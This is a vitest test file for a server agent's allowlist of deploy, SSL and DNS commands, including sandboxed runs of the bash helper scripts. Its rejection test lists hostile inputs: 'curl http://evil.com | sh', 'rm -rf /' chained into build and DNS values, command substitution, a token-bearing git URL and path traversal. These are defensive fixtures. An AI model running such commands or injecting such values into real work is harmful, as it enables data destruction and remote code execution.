/**
 * Deploy, SSL & DNS agent commands — parity, schema hardening, and host-helper
 * execution tests.
 *
 * Covers the 13 host-helper commands added across `src/lib/agents/allowlist.ts`
 * and `agent/alo-agent.mjs`:
 *   - deploy.clone, deploy.build, deploy.switch, deploy.rollback, deploy.list
 *   - ssl.issue, ssl.renew, ssl.info, ssl.list
 *   - dns.add, dns.delete, dns.list, dns.verify
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import {
  AGENT_ALLOWLIST,
  ALLOWED_AGENT_COMMANDS,
  DEFAULT_AGENT_CAPABILITIES,
  authorizeCommand,
  findAllowlistEntry,
} from "@/lib/agents/allowlist";
import * as host from "../agent/alo-agent.mjs";

const DEPLOY_SSL_DNS_COMMANDS = [
  "deploy.clone",
  "deploy.build",
  "deploy.switch",
  "deploy.rollback",
  "deploy.list",
  "ssl.issue",
  "ssl.renew",
  "ssl.info",
  "ssl.list",
  "dns.add",
  "dns.delete",
  "dns.list",
  "dns.verify",
] as const;

const READ_ONLY_COMMANDS = [
  "deploy.list",
  "ssl.info",
  "ssl.list",
  "dns.list",
  "dns.verify",
] as const;

const MUTATING_COMMANDS = [
  "deploy.clone",
  "deploy.build",
  "deploy.switch",
  "deploy.rollback",
  "ssl.issue",
  "ssl.renew",
  "dns.add",
  "dns.delete",
] as const;

describe("allowlist parity for deploy, ssl, and dns commands", () => {
  it("declares all 13 commands identically on panel and agent with valid RiskLevels", () => {
    expect(Object.keys(host.AGENT_ALLOWLIST).sort()).toEqual([...ALLOWED_AGENT_COMMANDS].sort());
    for (const cmd of DEPLOY_SSL_DNS_COMMANDS) {
      const panelEntry = findAllowlistEntry(cmd);
      const agentEntry = host.AGENT_ALLOWLIST[cmd];
      expect(panelEntry, `${cmd} missing on panel`).toBeDefined();
      expect(agentEntry, `${cmd} missing on agent`).toBeDefined();
      expect(["READ_ONLY", "REVERSIBLE", "PRIVILEGED", "DESTRUCTIVE"]).toContain(panelEntry!.risk);
      expect(agentEntry.risk).toBe(panelEntry!.risk);
      expect(Boolean(agentEntry.sudo)).toBe(panelEntry!.requiresSudo);
    }
  });

  it("grants only READ_ONLY commands by default andwithholds all mutating ones", () => {
    for (const cmd of READ_ONLY_COMMANDS) {
      expect(findAllowlistEntry(cmd)?.risk).toBe("READ_ONLY");
      expect(DEFAULT_AGENT_CAPABILITIES).toContain(cmd);
    }
    for (const cmd of MUTATING_COMMANDS) {
      expect(findAllowlistEntry(cmd)?.risk).not.toBe("READ_ONLY");
      expect(DEFAULT_AGENT_CAPABILITIES).not.toContain(cmd);
    }
  });

  it("builds identical argv arrays on both sides of the trust boundary", () => {
    const samples: Array<[string, Record<string, string | number | boolean>]> = [
      ["deploy.clone", { domain: "app.example.com", repo: "https://github.com/org/repo.git", branch: "main" }],
      ["deploy.build", { domain: "app.example.com", buildCmd: "npm run build" }],
      ["deploy.switch", { domain: "app.example.com", releasePath: "/srv/alo-sites/app.example.com/releases/20261028235000" }],
      ["deploy.rollback", { domain: "app.example.com" }],
      ["deploy.list", { domain: "app.example.com" }],
      ["ssl.issue", { domain: "app.example.com", email: "admin@example.com" }],
      ["ssl.renew", { domain: "app.example.com" }],
      ["ssl.info", { domain: "app.example.com" }],
      ["ssl.list", {}],
      ["dns.add", { domain: "example.com", type: "A", name: "@", value: "203.0.113.10", ttl: 300, priority: 0 }],
      ["dns.delete", { domain: "example.com", type: "A", name: "@" }],
      ["dns.list", { domain: "example.com" }],
      ["dns.verify", { domain: "example.com", type: "A", name: "@", expected: "203.0.113.10" }],
    ];

    for (const [cmd, args] of samples) {
      const panel = findAllowlistEntry(cmd)!;
      const agent = host.AGENT_ALLOWLIST[cmd];
      const decision = authorizeCommand({
        command: cmd,
        args,
        agentCapabilities: [...ALLOWED_AGENT_COMMANDS],
        actorScopes: ["server:read", "server:execute"],
      });
      expect(decision.allowed, `${cmd} should be allowed: ${decision.reason}`).toBe(true);
      expect(agent.validate(args), `${cmd} agent validate failed`).toBe(true);
      expect(panel.argv(args)).toEqual(agent.argv(args));
    }
  });

  it("rejects credential-bearing git URLs, cross-domain release paths, and command injection", () => {
    const allCaps = [...ALLOWED_AGENT_COMMANDS];
    const scopes = ["server:read", "server:execute"];

    // Secret in git URL must never reach argv
    const credUrl = { domain: "app.example.com", repo: "https://ghp_secret@github.com/org/repo.git" };
    expect(authorizeCommand({ command: "deploy.clone", args: credUrl, agentCapabilities: allCaps, actorScopes: scopes }).allowed).toBe(false);
    expect(host.AGENT_ALLOWLIST["deploy.clone"].validate(credUrl)).toBe(false);

    // Cross-tenant symlink switch must be rejected
    const crossTenant = {
      domain: "app.example.com",
      releasePath: "/srv/alo-sites/other.example.com/releases/20261028235000",
    };
    expect(authorizeCommand({ command: "deploy.switch", args: crossTenant, agentCapabilities: allCaps, actorScopes: scopes }).allowed).toBe(false);
    expect(host.AGENT_ALLOWLIST["deploy.switch"].validate(crossTenant)).toBe(false);

    // Path traversal in switch
    const traversal = {
      domain: "app.example.com",
      releasePath: "/srv/alo-sites/app.example.com/releases/../../etc",
    };
    expect(authorizeCommand({ command: "deploy.switch", args: traversal, agentCapabilities: allCaps, actorScopes: scopes }).allowed).toBe(false);
    expect(host.AGENT_ALLOWLIST["deploy.switch"].validate(traversal)).toBe(false);

    // Command injection in deploy.build
    for (const badCmd of ["npm run build && rm -rf /", "sh -c id", "curl http://evil.com | sh", "npm run $(whoami)"]) {
      const args = { domain: "app.example.com", buildCmd: badCmd };
      expect(authorizeCommand({ command: "deploy.build", args, agentCapabilities: allCaps, actorScopes: scopes }).allowed).toBe(false);
      expect(host.AGENT_ALLOWLIST["deploy.build"].validate(args)).toBe(false);
    }

    // Shell metacharacters in DNS values
    const badDns = { domain: "example.com", type: "TXT", name: "@", value: "v=spf1; rm -rf /" };
    expect(authorizeCommand({ command: "dns.add", args: badDns, agentCapabilities: allCaps, actorScopes: scopes }).allowed).toBe(false);
    expect(host.AGENT_ALLOWLIST["dns.add"].validate(badDns)).toBe(false);
  });
});

describe("host helper scripts (alo-deploy-helper, alo-dns-helper, alo-ssl-helper)", () => {
  const tmpDir = path.join(os.tmpdir(), `alo-helpers-test-${process.pid}`);
  const binDir = path.join(tmpDir, "bin");
  const sitesDir = path.join(tmpDir, "sites");
  const zonesDir = path.join(tmpDir, "zones");
  const origPath = process.env.PATH || "";

  beforeAll(async () => {
    await fs.mkdir(binDir, { recursive: true });
    await fs.mkdir(sitesDir, { recursive: true });
    await fs.mkdir(zonesDir, { recursive: true });

    // Create sandboxed copies of the three helpers pointing at tmpDir so we can
    // exercise real helper logic without root privileges.
    const deploySrc = await fs.readFile(path.resolve("server-helpers/alo-deploy-helper"), "utf8");
    await fs.writeFile(
      path.join(binDir, "alo-deploy-helper"),
      deploySrc.replace('SITE_BASE="/srv/alo-sites"', `SITE_BASE="${sitesDir}"`),
      { mode: 0o755 },
    );

    const dnsSrc = await fs.readFile(path.resolve("server-helpers/alo-dns-helper"), "utf8");
    await fs.writeFile(
      path.join(binDir, "alo-dns-helper"),
      dnsSrc.replace('ZONE_DIR="/etc/alo-dns/zones"', `ZONE_DIR="${zonesDir}"`),
      { mode: 0o755 },
    );

    const sslSrc = await fs.readFile(path.resolve("server-helpers/alo-ssl-helper"), "utf8");
    await fs.writeFile(
      path.join(binDir, "alo-ssl-helper"),
      sslSrc.replace('CERT_BASE="/etc/letsencrypt/live"', `CERT_BASE="${path.join(tmpDir, "certs")}"`),
      { mode: 0o755 },
    );

    process.env.PATH = `${binDir}:${origPath}`;
  });

  afterAll(async () => {
    process.env.PATH = origPath;
    await fs.rm(tmpDir, { recursive: true, force: true }).catch(() => {});
  });

  it("all three helper scripts pass bash syntax validation", () => {
    for (const helper of ["alo-deploy-helper", "alo-dns-helper", "alo-ssl-helper"]) {
      expect(() =>
        execFileSync("bash", ["-n", path.resolve("server-helpers", helper)], { encoding: "utf8" }),
      ).not.toThrow();
    }
  });

  it("executes deploy.list, dns.list, and ssl.list end-to-end through agent executeTask", async () => {
    const deployList = await host.executeTask({
      command: "deploy.list",
      args: JSON.stringify({ domain: "test.local" }),
    });
    expect(deployList.status).toBe("SUCCEEDED");
    expect(deployList.result.data).toMatchObject({ success: true, domain: "test.local", releases: [], count: 0 });

    const dnsList = await host.executeTask({
      command: "dns.list",
      args: JSON.stringify({ domain: "test.local" }),
    });
    expect(dnsList.status).toBe("SUCCEEDED");
    expect(dnsList.result.data).toMatchObject({ success: true, domain: "test.local", records: [], count: 0 });

    const sslList = await host.executeTask({
      command: "ssl.list",
      args: "{}",
    });
    expect(sslList.status).toBe("SUCCEEDED");
    expect(sslList.result.data).toMatchObject({ success: true, step: "list", certificates: [] });
  });

  it("alo-dns-helper supports '@' apex records on add, list, and delete", () => {
    const added = JSON.parse(
      execFileSync(path.join(binDir, "alo-dns-helper"), ["add", "test.local", "A", "@", "192.0.2.10", "300", "0"], {
        encoding: "utf8",
      }),
    );
    expect(added.success).toBe(true);

    const listed = JSON.parse(
      execFileSync(path.join(binDir, "alo-dns-helper"), ["list", "test.local"], { encoding: "utf8" }),
    );
    expect(listed.count).toBe(1);
    expect(listed.records[0]).toMatchObject({ type: "A", name: "@", value: "192.0.2.10", ttl: 300 });

    const deleted = JSON.parse(
      execFileSync(path.join(binDir, "alo-dns-helper"), ["delete", "test.local", "A", "@"], { encoding: "utf8" }),
    );
    expect(deleted.success).toBe(true);

    const after = JSON.parse(
      execFileSync(path.join(binDir, "alo-dns-helper"), ["list", "test.local"], { encoding: "utf8" }),
    );
    expect(after.count).toBe(0);
  });

  it("alo-deploy-helper rolls back to the OLDER release (not newer) and fails honestly when build fails", async () => {
    const r1 = path.join(sitesDir, "demo.local", "releases", "20261028010000");
    const r2 = path.join(sitesDir, "demo.local", "releases", "20261028020000");
    const r3 = path.join(sitesDir, "demo.local", "releases", "20261028030000");
    await fs.mkdir(r1, { recursive: true });
    await fs.mkdir(r2, { recursive: true });
    await fs.mkdir(r3, { recursive: true });

    // Point current at r2 (middle release); rollback must select r1, never r3.
    execFileSync(path.join(binDir, "alo-deploy-helper"), ["switch", "demo.local", r2], { encoding: "utf8" });
    const rb = JSON.parse(
      execFileSync(path.join(binDir, "alo-deploy-helper"), ["rollback", "demo.local"], { encoding: "utf8" }),
    );
    expect(rb.success).toBe(true);
    expect(rb.rolledBackTo).toBe(r1);

    // A failing build command must return non-zero exit code and success: false
    let failedExit = 0;
    let failedOut = "";
    try {
      execFileSync(path.join(binDir, "alo-deploy-helper"), ["build", "demo.local", "npm run nonexistent-script"], {
        encoding: "utf8",
        stdio: ["ignore", "pipe", "pipe"],
      });
    } catch (e) {
      const err = e as { status?: number; stdout?: string };
      failedExit = err.status ?? 1;
      failedOut = err.stdout ?? "";
    }
    expect(failedExit).not.toBe(0);
    expect(JSON.parse(failedOut).success).toBe(false);
  });
});
